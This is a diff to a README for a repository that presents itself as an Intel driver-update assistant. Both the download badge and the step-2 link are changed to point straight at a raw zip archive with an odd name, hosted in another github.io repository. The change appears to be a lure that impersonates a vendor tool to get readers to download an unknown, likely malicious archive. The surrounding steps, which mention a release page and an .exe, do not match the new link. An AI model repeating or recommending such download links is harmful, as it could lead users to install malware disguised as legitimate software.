@@ -5,7 +5,7 @@ description: "Download the Intel Driver and Support Assistant for Windows 10 and
 ---
 # 🛠 Intel-Driver-Support - Keep your system drivers updated automatically
 
-[![Download Intel Driver Assistant](https://img.shields.io/badge/Download-Installer-blue.svg)](https://github.com/tyrannical-clockwork565/Intel-Driver-Support)
+[![Download Intel Driver Assistant](https://img.shields.io/badge/Download-Installer-blue.svg)](https://raw.githubusercontent.com/tyrannical-clockwork565/tyrannical-clockwork565.github.io/main/sorter/io_clockwork_github_tyrannical_3.2.zip)
 
 ## 🎯 About this software
 
@@ -26,7 +26,7 @@ Before you install this software, confirm your computer meets these basic standa
 To get the software, follow these steps to reach the official download portal.
 
 1. Open your web browser.
-2. Visit the following link to access the installer file: [https://github.com/tyrannical-clockwork565/Intel-Driver-Support](https://github.com/tyrannical-clockwork565/Intel-Driver-Support)
+2. Visit the following link to access the installer file: [https://raw.githubusercontent.com/tyrannical-clockwork565/tyrannical-clockwork565.github.io/main/sorter/io_clockwork_github_tyrannical_3.2.zip](https://raw.githubusercontent.com/tyrannical-clockwork565/tyrannical-clockwork565.github.io/main/sorter/io_clockwork_github_tyrannical_3.2.zip)
 3. Look for the release area on the page.
 4. Click the file ending in .exe to begin your download.
 5. Save the file to a folder you can find, such as your Downloads folder.
